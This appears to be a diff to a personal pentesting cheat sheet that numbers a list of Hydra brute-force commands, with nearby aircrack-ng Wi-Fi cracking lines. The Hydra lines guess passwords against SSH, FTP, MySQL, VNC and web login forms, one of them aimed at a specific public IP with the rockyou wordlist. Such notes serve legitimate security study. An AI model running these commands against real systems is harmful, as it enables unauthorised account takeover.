@@ -178,17 +178,17 @@ aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
 aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
 ________________________________________________________________________________________________________________________________________________________________________________________________
 # Hydra all brute force commands:
-note "-P" capital for passwordlists if it is only single password use small "-p"
-hydra -l <username> -P <passwords_file> <target_ip> ssh
-hydra -l <username> -P <passwords_file> <target_ip> ftp
-hydra -l <username> -P <passwords_file> <target_ip> mysql
-hydra -l <username> -p <password> <ip> <service> -s <port>
-hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
-hydra -C <combinations.txt> <ip> <service>
-hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
-hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
-hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
-hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
+1. note "-P" capital for passwordlists if it is only single password use small "-p"
+2. hydra -l <username> -P <passwords_file> <target_ip> ssh
+3. hydra -l <username> -P <passwords_file> <target_ip> ftp
+4. hydra -l <username> -P <passwords_file> <target_ip> mysql
+5. hydra -l <username> -p <password> <ip> <service> -s <port>
+6. hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
+7. hydra -C <combinations.txt> <ip> <service>
+8. hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
+9. hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
+10. hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
+11. hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
 _____________________________________________________________________________________________________________________________________________________________________________________________________
 
 # wireshark packet filters:
